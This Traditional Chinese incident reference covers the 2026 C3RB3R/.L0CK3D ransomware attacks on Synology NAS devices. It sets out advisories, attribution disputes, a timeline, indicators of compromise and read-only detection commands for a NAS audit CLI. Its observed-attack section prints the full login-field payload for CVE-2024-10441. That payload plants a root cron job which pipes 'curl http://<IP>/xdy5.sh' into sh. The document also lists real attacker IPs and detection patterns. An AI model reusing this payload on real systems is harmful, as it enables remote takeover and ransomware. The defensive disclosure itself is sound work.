# 針對 Synology NAS 的 C3RB3R / `.L0CK3D` 勒索軟體攻擊

[English](INCIDENT-C3RB3R.md) · [繁體中文](INCIDENT-C3RB3R.zh-TW.md) · [简体中文](INCIDENT-C3RB3R.zh-CN.md)

針對 2026 年 10 月鎖定暴露於網際網路之 Synology NAS 裝置的勒索軟體攻擊活動，本文件提供公開事件參考資訊、入侵指標（IoC）、CLI 驗證步驟與復原指南。

## 摘要

- 2026 年 10 月，一波勒索軟體攻擊加密了暴露於網際網路的 Synology NAS 裝置，在檔案後方加上 `.L0CK3D` 副檔名（中間為數字零），並在每個目錄下放置名為 `read-me3.txt` 的勒索信 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- 寫入每一層資料夾與根目錄的 `read-me3.txt` 勒索信內含 `C3RB3R INSTRUCTIONS` 字樣 ([HKEPC on Threads, 2026-10-29](https://www.threads.com/@hkepc/post/DfFNi9Xibnj))；itnotetk 指出 `C3RB3R INSTRUCTIONS` 為該勒索信的標題，且每封勒索信中皆包含一組本機產生的 6 位數裝置 ID ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- 根據奇虎 360 對樣本 MD5 `a1375e0f82ae86df528876c049b5a23c` 的分析，該加密程式對每個檔案使用以 RSA-2048 封裝並附加於檔案末端的 256 位元 ChaCha8 金鑰與 64 位元 nonce，對 187 種優先副檔名進行完整加密、對其他檔案進行部分加密，並略過 27 個系統目錄 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **[社群回報]** 受害者回報每個被加密的檔案大小會增加 588 bytes，大型非優先加密檔案（例如 21 MB 的 PDF）會有三段約 4% 的區段被加密，且 Kaspersky（`RakhniDecryptor`）、Emsisoft 與 Dr.Web（`Trojan.Encoder.38200`）現有的解密工具皆無法解密這些檔案 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- 研究人員對該惡意軟體家族的淵源看法不一：奇虎 360 將 C3RB3R 歸類為 Cerber 家族的變種 ([360, 2026-10-29](https://www.360.cn/n/13055.html))，而 BleepingComputer 論壇的研究人員則自 2022 年起便將 C3RB3R 追蹤為基於外洩 Conti v3 原始碼所建構的分支 ([BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- **[社群回報]** 未經證實的回報指出，攻擊者的付款入口網站提供免費解密一個 1024 KB 以下的檔案，並勒索 0.037 至 0.085 BTC（五天後翻倍），同時宣稱已竊取資料，但目前並無已知的外洩網站佐證該說法 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 已知事實（附來源）

### Synology 官方聲明與 Synology-SA-24:20

- **[第一手來源]** 2026-10-29，Synology 發布資安聲明，表示「發現威脅行為者正利用一項已於 2024 年 12 月修補的漏洞」，針對執行過舊 DSM 版本的裝置加密資料並勒索贖金；該聲明直接連結至資安公告 Synology-SA-24:20，並呼籲使用者更新 DSM 及啟用自動更新 ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。
- **[第一手來源]** Synology 於 2026-10-29 發布的聲明中並未點名特定 CVE 編號、修補版號或受害裝置數量，亦未提及 `C3RB3R`、`.L0CK3D`、`read-me3.txt`、QuickConnect、連接埠、密碼或快照等字眼 ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。
- **[第一手來源]** Synology-SA-24:20（2024-11-05 發布、2024-12-05 新增 DSM 6.2 修正、2025-03-19 揭露技術細節、2025-03-28 最後更新）涵蓋 CVE-2024-10441（CVSS 3.1 9.8 Critical，系統外掛程式守護程序中的輸出編碼不當漏洞，允許遠端執行任意程式碼，曾於 Pwn2Own 2024 展示）、CVE-2024-50629（CVSS 5.3）與 CVE-2024-10445（CVSS 4.3），已修正版本為 DSM 7.2.2-72806-1、7.2.1-69057-6、7.2-64570-4、7.1.1-42962-7 與 6.2.4-25556-8 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。

### 奇虎 360 的分析與 Synology-SA-26:13

- **[360 調查結果之第一手來源]** 奇虎 360 反勒索團隊回報自 2026 年 10 月起接獲多起 Synology NAS 勒索軟體案例，將攻擊歸因於 C3RB3R，並指稱 CVE-2026-13639 與 CVE-2026-13684（已於 Synology-SA-26:13 修補）為遭當作 1-day 漏洞利用的入侵破口 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **[第一手來源]** Synology-SA-26:13（2026-09-18 發布，Critical，Resolved，緩解措施為「None」）修補了 8 個 DSM 漏洞：CVE-2026-13684（SCGI，CWE-116，CVSS 9.8，未經身分驗證的任意檔案讀寫與 DoS）、CVE-2026-13639（登入邏輯，CWE-331 熵值不足，CVSS 9.8，未經身分驗證的任意檔案讀寫與 DoS）、CVE-2026-13673（LDAP API，CVSS 8.8，需身分驗證）、CVE-2026-6205（Upload API，CVSS 8.1，需身分驗證）、CVE-2026-13635（Auth API，CVSS 5.3）、CVE-2026-13623（Theme API XSS，CVSS 4.8，需管理員權限）、CVE-2026-13666（Sharing API CRLF，CVSS 3.5）以及 CVE-2026-13683（EventScheduler API SQLi，CVSS 2.7，需管理員權限） ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13))。
- **[第一手來源]** 新加坡網路安全局（CSA）警報 AL-2026-127 點出 SA-26:13 中嚴重程度最高的四個 CVE（9.8、9.8、8.8、8.1），影響範圍涵蓋 DSM 7.4、7.3 與 7.2，並建議管理員立即安裝修補程式 ([CSA Singapore AL-2026-127, 2026-09-23](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-127/))。

| DSM 分支 | SA-26:13 修補版本 | SA-24:20 修補版本 |
|---|---|---|
| DSM 7.4 | `7.4-90075` 及更新版本 | 已內建於基準版本 |
| DSM 7.3.2 | `7.3.2-86009 Update 4` (`7.3.2-86009-4`) | 已內建於基準版本 |
| DSM 7.2.2 | `7.2.2-72806 Update 9` (`7.2.2-72806-9`) | `7.2.2-72806-1` |
| DSM 7.2.1 | `7.2.1-69057 Update 12` (`7.2.1-69057-12`) | `7.2.1-69057-6` |
| DSM 7.2 | 未列於 SA-26:13（請升級至有修補的分支） | `7.2-64570-4` |
| DSM 7.1 及更舊版本 | 未列於 SA-26:13（請升級至有修補的分支） | `7.1.1-42962-7` / `6.2.4-25556-8` |

### Synology-SA-26:14（「PHP2Shell」）

- **[第一手來源]** Synology-SA-26:14（2026-10-22 發布，2026-10-26 更新，Critical，Resolved）修補了 CVE-2026-109618 與 CVE-2026-109619（Synology 公告中為 CVSS 3.1 9.8；NVD/CyberQ 中為 CVSS v4.0 9.2），這兩個漏洞為 PHP 核心記憶體損毀與內部請求狀態殘留瑕疵，可導致遠端程式碼執行 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **[第一手來源]** SA-26:14 下的修補套件版本為 Synology Calendar `3.0.4-21435`、MailStation `30000002.3.19-20333`、PHP 7.4 `7.4.33-0131`、PHP 8.0 `8.0.30-0122`、PHP 8.1 `8.1.34-0120`、PHP 8.2 `8.2.35-0171`、PHP 8.3 `8.3.36-0051` 與 PHP 8.4 `8.4.27-0051`；PHP 7.3 已終止支援（EoL）故無修正程式，而 Hyper Backup（於 2026-10-26 第 2 版修訂中新增）則列為不受影響 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14))。
- **[第一手來源]** Synology 的 PHP2Shell 聲明列出了 10 個依賴 PHP 套件而受影響的套件（Calendar、IDrive、Joomla、KodExplorer、MailStation、MediaWiki、phpMyAdmin、vtigerCRM、Web Station、WordPress），指出 MailStation 必須手動更新、說明 IDrive 為第三方套件且 Synology Drive 不受 PHP2Shell 影響，並將 PHP 安全性更新延伸提供給已終止支援的 DSM 7.2/7.1/7.0 與 6.2；同時表示 DSM 內建的 PHP 元件不含外部可存取的模組（Synology PSIRT 評估風險極低，並計畫於後續 DSM 版本中修正） ([Synology PHP2Shell statement, 2026-10-22 / 2026-10-28](https://www.synology.com/en-us/company/news/article/php2shell/Synology%20extends%20PHP2Shell%20security%20updates%20to%20end-of-life%20DSM%20versions))。
- **[第一手來源]** CISA 於 2026-10-26 將 CVE-2026-109618 與 CVE-2026-109619 列入已知遭利用漏洞（KEV）目錄，但針對的是一般 PHP 漏洞利用，而非特定針對 Synology 的攻擊 ([CISA KEV alert, 2026-10-26](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog))。
- **[社群回報]** 使用者回報在套件中心（Package Center）解除安裝 PHP 7.4 時，若 Hyper Backup 依賴該套件，系統會一併提示移除 Hyper Backup；改為停用或更新 PHP 7.4 即可避免移除 Hyper Backup ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。

### 各方來源對入侵途徑歸因的分歧

- **Synology (SA-24:20)：** Synology 於 2026-10-29 發布的官方聲明將針對過舊 DSM 版本的勒索軟體攻擊連結至 Synology-SA-24:20（已於 2024 年 12 月修補，涵蓋 CVE-2024-10441） ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions))。
- **[社群回報] 與 CVE-2024-10441 吻合的鑑識日誌：** Reddit 使用者 `u/NakamuraHwang`（DS918+）檢查了日誌與系統檔案，將入侵途徑追溯至 CVE-2024-10441 ([LavX News relay of Tom's Hardware, 2026-10-29](https://news.lavx.hu/article/ransomware-hits-internet-exposed-synology-nas-via-18-month-old-remote-code-flaw), [Mallory summary](https://mallory.ai/stories/01a187e2-d9c9-7ab1-b0ef-d1b444d9a0f3))；Dongyun Lab 轉述了擷取到的內容：發送至對外開放之 DSM 登入頁面的請求中，使用者名稱欄位帶有 `PLUGIN_VALUE_END`、`LD_PRELOAD` 與 `LD_DEBUG_OUTPUT`，兩分鐘後 root 便執行了 `/etc/cron.d/synot*` ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。實際觀測到的攻擊案例（2026-10-28）：該請求為 `SYNO.API.Auth` v7 `login`，且 payload 出現在 `/var/log/synoplugin.log*` 中（見[下文](#實際觀測到的攻擊案例-2026-10-28)）。
- **奇虎 360 (SA-26:13)：** 奇虎 360 的分析將 2026 年 10 月 Synology NAS C3RB3R 入侵事件歸因於對 CVE-2026-13639 與 CVE-2026-13684（出自 Synology-SA-26:13）的 1-day 漏洞利用 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **[媒體報導] 未經證實的 PHP2Shell (SA-26:14) 與容器入侵說法：** Guru3d 轉述 HKEPC 報導，列出了傳聞中的入侵途徑：NAS 上執行 GitLab 等網頁服務並對應至網際網路的 Docker 容器（引用 GitLab CVE-2026-110264 與 CVE-2026-97229），以及 Synology 套件漏洞，並為此引用了 SA-26:14（PHP 核心 RCE，PHP2Shell）；報導中並未表示 Synology 將 SA-26:14 與此次攻擊活動連結，而 Synology 自身的聲明連結的是 SA-24:20，且 CyberQ 與 XFastest HK 皆指出目前並無確切證據顯示 PHP2Shell 與 `.L0CK3D` 勒索軟體案例有關 ([Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/), [HeaTalk, 2026-10-30](https://www.heatalk.com/20261030/17076/), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [XFastest HK, 2026-10-30](https://hk.xfastest.com/195038/synology-nas-attack/))。
- **[社群回報] 關於較新 DSM 版本的間接回報：** 部分轉述報導提及有受害者自稱使用 DSM `7.2.1-69057 Update 9`，以及一起 Solar 事件應變案例自稱使用 DSM `7.4.1-90080 Update 1`（版本新於 SA-26:13 修補程式），且應變人員未排除存在尚未修補之途徑的可能性 ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/), [Appinn, 2026-10-29](https://www.appinn.com/synology-nas-ransomware-2026))。

### 歷史脈絡：過往針對 Synology NAS 的攻擊活動

- **SynoLocker (2014) [第一手來源]：** 利用了 DSM 4.3-3810 及更舊版本上兩個已於 2013 年底修補的 DSM 漏洞；當時受影響的裝置在 DSM 更新中會誤報為「DSM 已是最新版本」 ([Synology SynoLocker advisory, 2014-08-07](https://www.synology.com/en-uk/security/advisory/SynoLocker))。
- **2019 年 7 月暴力破解潮與 eCh0raix / QNAPCrypt [第一手來源 / 媒體報導]：** 攻擊者利用殭屍網路對暴露於網際網路的 DSM 管理員帳號進行憑證填充（credential stuffing）與字典攻擊，藉此部署 eCh0raix 勒索軟體 ([Synology 2019 ransomware release, 2019-07-23](https://www.synology.com/en-uk/company/news/article/2019JulyRansomware), [Security Affairs, 2021-08](https://securityaffairs.com/120994/cyber-crime/ech0raix-ransomware-qnap-synology.html), [Unit 42, 2021-08-10](https://unit42.paloaltonetworks.com/ech0raix-ransomware-soho/))。
- **StealthWorker 殭屍網路 (2021) [第一手來源]：** Synology PSIRT 追蹤了持續針對暴露在外之 NAS 裝置弱管理員憑證進行的殭屍網路暴力破解攻擊 ([Synology BruteForce release, 2021-08-04](https://www.synology.com/en-global/company/news/article/BruteForce))。
- **DeadBolt (2022) [第一手來源]：** 鎖定對外開放的 QNAP 與 ASUSTOR NAS 裝置，雖無已確認的 Synology 受害案例，但也再次印證了切勿將 NAS 管理介面暴露於公共網際網路的資安原則 ([Trend Micro, 2022-06-06](https://www.trendmicro.com/en_gb/research/22/f/closing-the-door-deadbolt-ransomware-locks-out-vendors-with-mult.html))。
- **RISK:STATION (2024) [第一手來源]：** Midnight Blue 揭露了 Synology Photos 中的 CVE-2024-10443，並證明 QuickConnect TLS 憑證會出現在公開的憑證透明度（Certificate Transparency）日誌中，使得數百萬個 `*.quickconnect.to` 子網域可被列舉，且即使路由器未設定連接埠轉送，仍可透過 QuickConnect 中繼連入 ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation))。

## 事件時間軸

- **2024-11-05 / 2024-12-05：** Synology 發布 Synology-SA-24:20，於 DSM 7.1/7.2 修補 CVE-2024-10441，並於 2024 年 12 月補上 DSM 6.2 的修正程式 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。
- **2026-09-18：** Synology 發布 Synology-SA-26:13，修補 CVE-2026-13684、CVE-2026-13639 及另外 6 個 DSM 漏洞 ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13))。
- **2026-09-23：** 新加坡網路安全局（CSA）發布警報 AL-2026-127，呼籲立即安裝 Synology-SA-26:13 修補程式 ([CSA Singapore AL-2026-127](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-127/))。
- **2026 年 10 月初：** 奇虎 360 開始接獲 Synology NAS 裝置遭 C3RB3R / `.L0CK3D` 加密的通報 ([360, 2026-10-29](https://www.360.cn/n/13055.html))。
- **2026-10-17 起：** **[社群回報]** NAS 受害者（包含 Synology 以及一台 Zyxel NAS326）開始在 BleepingComputer 的 C3RB3R 求助討論串發文 ([BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **2026-10-22：** Synology 發布 Synology-SA-26:14（「PHP2Shell」，CVE-2026-109618 與 CVE-2026-109619），並將 PHP 套件更新延伸至已終止支援的 DSM 分支 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [Synology PHP2Shell statement](https://www.synology.com/en-us/company/news/article/php2shell/Synology%20extends%20PHP2Shell%20security%20updates%20to%20end-of-life%20DSM%20versions))。
- **2026-10-26：** Synology 更新 SA-26:14 註明 Hyper Backup 不受影響，同日 CISA 將 CVE-2026-109618 與 CVE-2026-109619 列入 KEV 目錄 ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [CISA KEV alert](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog))。
- **2026-10-28：** **[社群回報]** `r/synology` 在 12 小時內出現至少四篇求助貼文（[itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)，例如這篇 [r/synology post](https://www.reddit.com/r/synology/comments/1xhyt6w/hit_with_c3rb3r_ransomware_this_am/)），且 `u/NakamuraHwang` 貼出本機鑑識報告，顯示登入注入（`PLUGIN_VALUE_END`、`LD_PRELOAD`、`LD_DEBUG_OUTPUT`）與 root cron 工作 `/etc/cron.d/synot*` ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。
- **2026-10-29：** Synology 發布官方聲明將攻擊連結至 SA-24:20，同日奇虎 360 發表 C3RB3R 技術分析 ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions), [360, 2026-10-29](https://www.360.cn/n/13055.html), [HKEPC on Threads](https://www.threads.com/@hkepc/post/DfFNi9Xibnj))。
- **2026-10-30：** CyberQ、XFastest HK 與 itnotetk 發布綜合分析，比對 Synology 的 SA-24:20 聲明、360 的 SA-26:13 歸因與受害者回報 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [XFastest HK, 2026-10-30](https://hk.xfastest.com/195038/synology-nas-attack/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 攻擊手法分析

### NAS 是如何變成可從網際網路連入的

- **[社群回報]** 在 CyberQ 彙整的受害者回報中，DSM 登入頁面可透過路由器的 UPnP 自動連接埠對應、為了 Plex 或串流開啟的連接埠轉送、QuickConnect 或反向代理（其中一台 NAS 位於 nginx 後方；另一台透過路由器轉送了 SMB）從網際網路連入；每一起已知細節的案例皆設定了連接埠轉送或直接暴露管理介面，CyberQ 的建議中特別點名了連接埠 5000/5001（DSM）與 445（SMB） ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **[第一手來源]** QuickConnect 憑證會記錄於公開的憑證透明度（Certificate Transparency）日誌中，使攻擊者得以列舉 `*.quickconnect.to` 子網域，就算路由器未轉送任何連接埠，仍可透過 QuickConnect 中繼連達 DSM ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation))。
- **[第一手來源]** 當 NAS 自行透過 PPPoE 撥號、位於路由器 DMZ 區，或持有全域 IPv6 位址且路由器或 DSM 防火牆未設定連入阻擋（drop）規則時，所有監聽中的服務皆可直接從網際網路連入 ([Synology Firewall Help](https://kb.synology.com/en-global/DSM/help/DSM/AdminCenter/connection_security_firewall?version=7))。
- **[社群回報]** CyberQ 透過 pwn.watch 轉述 360 反勒索團隊的說法，說明了 CVE-2026-13639（DSM 登入邏輯中的熵值不足）與 CVE-2026-13684（DSM SCGI 元件中的輸出編碼不當）：攻擊者的登入請求從未成功登入，卻能以系統權限讀寫檔案，因此密碼與兩步驟驗證皆無法阻擋；多名受害者表示當時已開啟兩步驟驗證、強密碼、停用 `admin` 以及啟用 AutoBlock ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))。
- **[社群回報]** 處於 DSM `7.1.1-42962 Update 9` 等舊分支的裝置在控制台（Control Panel）中會顯示「您的 DSM 版本已是最新」，這是因為若未手動升級，DSM 自動更新不會自動跨越主／次版本分支 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。
- **[社群回報]** 長期插在機器上的 USB 備份硬碟與未做版本隔離的本機 Hyper Backup 目的地，皆與共用資料夾一併遭到加密；在其中一起案例（`u/avebelle`）中，36 個快照有 35 個同時被移除，但其他受害者則發現其 Btrfs 快照完好無損並成功從快照還原 ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/))；Dongyun Lab 指出該加密腳本僅走訪一般資料夾，並未執行任何刪除 Btrfs 快照的指令 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。

### 實際觀測到的攻擊案例 (2026-10-28)

**[社群回報]** 實際觀測到的攻擊案例（2026-10-28）：透過 DSM 登入介面利用 CVE-2024-10441（Synology-SA-24:20，系統外掛程式守護程序中的輸出編碼漏洞） ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。該請求為 `SYNO.API.Auth` v7 `login`，其帳號欄位內容如下（換行與 tab 皆為實際字元）：

```
admin
PLUGIN_VALUE_END
LD_PRELOAD=PLUGIN_VALUE_START
NOP
*	*	*	*	*	root	echo	<base64 of "curl -s http://<IP>/xdy5.sh|sh">	|base64	-d|sh
NOP
PLUGIN_VALUE_END
LD_DEBUG=libs
LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>
ESCAPE=PLUGIN_VALUE_START
NOP
```

實際觀測到的攻擊案例（2026-10-28）：該欄位為外掛程式程序設定了 `LD_DEBUG=libs` 與 `LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>`，使得 glibc 的載入器除錯輸出（其中會重複印出帳號欄位內容，進而包含該行 cron 排程）被寫入 `/etc/cron.d/`。該行的排程欄位為 `* * * * *`：cron 每分鐘會以 root 身分執行一次，解碼後即為 `curl -s http://<IP>/xdy5.sh|sh`。Dongyun Lab 也描述了相同結果：在檢查帳號之前，glibc 動態載入器就已用 root 權限將該行寫入 `/etc/cron.d/` ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。CVE-2024-10441 已於 SA-24:20 各修補版本中修正 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20))。

- **[社群回報]** 在 Dongyun Lab 轉述的擷取紀錄中，夾帶注入內容的登入請求（NAS 時間約 13:45）由系統外掛程式守護程序 `synotade` 處理，兩分鐘後（13:47）root 便執行了 `/etc/cron.d/synot*`，下載 `http://46.8.78.122/xdy5.sh`。該腳本將核心加密程式存為 `/bin/qnetd` 並啟動、下載 `/bin/libgld` 作為備用 payload，並建立 `/bin/l0ck.enc` 作為標記檔以確保同一時間只有一個加密程序在執行（加密完成後即移除）；`rm.log` 則顯示了清理暫存檔 `synotade.<PID>` 的紀錄。部分受害者在檔案被加密前收到了日誌中心（Log Center）寄出的 `.SYNOACCOUNTDB` 資料庫損毀通知信，另有一名 V2EX 受害者在加密開始前 8 分鐘記錄到來自 `46.8.78.122` 的登入失敗紀錄 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128))。有一名受害者看到加密程序名稱為 `libgld`，且在其中一起案例中，DSM 被重置為全新狀態，並多出一個 `admin2` 家目錄 ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/))。

## 入侵指標（IoC）與 `nas incident --deep` 的檢查方式

| 指標 | 位置 | 檢查項目 | 來源 |
|---|---|---|---|
| 登入紀錄中出現 `PLUGIN_VALUE_END`、`LD_PRELOAD=`、`LD_DEBUG_OUTPUT` | DSM 連線紀錄（`SYNO.Core.SyslogClient.Log`，約最近 10,000 筆） | `exploit_attempts`（一般工作階段） | 實際觀測到的攻擊案例（2026-10-28）；字串亦見於 [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128) |
| 相同字串，且帶有 payload 的 `POST weblogin Args: USER=...` | `/var/log/synoplugin.log*`（僅限 root，輪替壓縮為 `.xz`） | `exploit_attempts_logs`（`--deep`） | 實際觀測到的攻擊案例（2026-10-28） |
| 帶有 payload 的 "failed to sign in" 事件文字 | `/var/log/synoscgi.log*`（僅限 root，`.xz`） | `exploit_attempts_logs` | 實際觀測到的攻擊案例（2026-10-28） |
| `authentication failure ... rhost=<IP>`（無 `user=` 欄位） | `/var/log/auth.log*`（僅限 root） | `exploit_attempts_logs` | 實際觀測到的攻擊案例（2026-10-28） |
| 來源位址 `46.8.78.122`、`104.253.175.125`（`incident.ioc_ips`，可擴充） | 上述所有日誌與連線 | `exploit_attempts`, `exploit_attempts_logs`, `ioc_processes` | `46.8.78.122`：[Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)；`104.253.175.125`：實際觀測到的攻擊案例（2026-10-28） |
| `/etc/cron.d/synot*`，以及含有 `base64 -d`、`\| sh`、`curl`/`wget`、`xdy5` 的 cron 行 | `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron` | `ioc_cron` | `/etc/cron.d/synot*`、`xdy5.sh`：[Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)；`echo <base64> \| base64 -d \| sh` 該行：實際觀測到的攻擊案例（2026-10-28） |
| `/bin/libgld`、`/bin/qnetd`、`/bin/l0ck.enc`、任何 `xdy5*` 檔案 | `/bin`、`/usr/bin`、暫存資料夾、`/etc`、`/root`、`/var/spool`（3 層內） | `ioc_binaries` | [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128) |
| 第二個 uid 0 帳號；uid >= 1024 的未知帳號 | `/etc/passwd`（排除套件帳號與 `incident.allowed_users`） | `ioc_users` | `admin2` 家目錄：[itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)；uid 檢查為通用持久化後門檢查 |
| root 或任何家目錄的 `authorized_keys` | `/root/.ssh`, `/var/services/homes/*/.ssh`, `/volume*/homes/*/.ssh` | `ioc_ssh_keys` | 通用持久化後門檢查 |
| 名為 `libgld`/`qnetd`/`xdy5*` 或從 `/tmp`、`/var/tmp`、`/dev/shm` 執行的程序；位於 Synology 路徑外的執行檔；連往公開位址的已建立 TCP 連線（會回報）、連往 IOC 位址的連線（FAIL） | `/proc` | `ioc_processes` | 名稱：[Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)；其餘為通用檢查 |
| 符合 `*.L0CK3D`、`*.LOCK3D` 或 `read-me3.txt` 的檔案 | 透過 File Station 搜尋所有可見的共用資料夾 | `ransomware_files`（`--scan`） | `*.L0CK3D`、`read-me3.txt`：[360, 2026-10-29](https://www.360.cn/n/13055.html)；`*.LOCK3D`（英文字母 O）：[BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4) |

判定結果：命中已知惡意特徵 = `FAIL`；未知項目（Synology 路徑外的 cron 行、未列入允許清單的帳號、Synology 路徑外的執行檔、`(deleted)` 已刪除的執行檔、任何 `authorized_keys`）= `WARN`；日誌中出現攻擊嘗試 = `WARN` 並註明 "attempt seen"。容器內的程序僅計數而不判定。日誌文字會以資料形式呈現：控制字元皆經過跳脫處理，過長的內容會截斷；加上 `--json` 時會在 `deep` 欄位下附上收集器的原始結果。

`--deep` 的運作方式：

- `--backend password`：在任務排程表（Task Scheduler）中建立一個暫時性的 root 任務（呼叫 `SYNO.Core.TaskScheduler.Root create`，需先通過 `SYNO.Core.User.PasswordConfirm`，接著以 `run` v2 執行，完成後立即刪除），執行一段 Python 腳本（在任務腳本中以 zlib + base64 編碼） ([DSM-API-NOTES.md](DSM-API-NOTES.md))。若 `deploy.stage_dir` 為符號連結（symlink）便會停止；腳本會寫入單一檔案 `<stage_dir>/nas-deep-<random>.json`（使用 `O_CREAT|O_EXCL|O_NOFOLLOW`）並夾帶隨機標記，接著由 CLI 透過 File Station 讀取、核對標記無誤後將其刪除 ([DSM-API-NOTES.md](DSM-API-NOTES.md))。必須先設定 `deploy.stage_dir`（指向該帳號可寫入之共用資料夾內的子資料夾；若不存在會自動建立）。
- `--backend local`（在 NAS 本機上以 root 執行）：直接執行同一支腳本並印出 JSON ([DSM-API-NOTES.md](DSM-API-NOTES.md))。
- 除此之外不會寫入任何內容；該腳本僅進行唯讀檢查 ([DSM-API-NOTES.md](DSM-API-NOTES.md))。

手動以 root 執行的等效指令：`xzcat -f /var/log/synoplugin.log* /var/log/synoscgi.log* /var/log/auth.log* | grep -E 'PLUGIN_VALUE_END|LD_DEBUG_OUTPUT|46\.8\.78\.122|104\.253\.175\.125'`、`ls -la /etc/cron.d /bin/libgld /bin/qnetd /bin/l0ck.enc`、`awk -F: '$3>=1024 || ($3==0 && $1!="root")' /etc/passwd`、`ls -la /root/.ssh /var/services/homes/*/.ssh`、`ls -l /proc/*/exe`、`cat /proc/net/tcp`。

## 使用 CLI 判斷「我是否受到影響？」的步驟

1. **執行包含連接埠探測與勒索信搜尋的唯讀稽核：**
   ```bash
   nas incident --probe --scan --json
   ```
2. **執行深度 root 收集器，檢查僅限 root 讀取的日誌、crontab、執行檔、使用者、SSH 金鑰與 `/proc`：**
   ```bash
   nas incident --deep --json
   ```
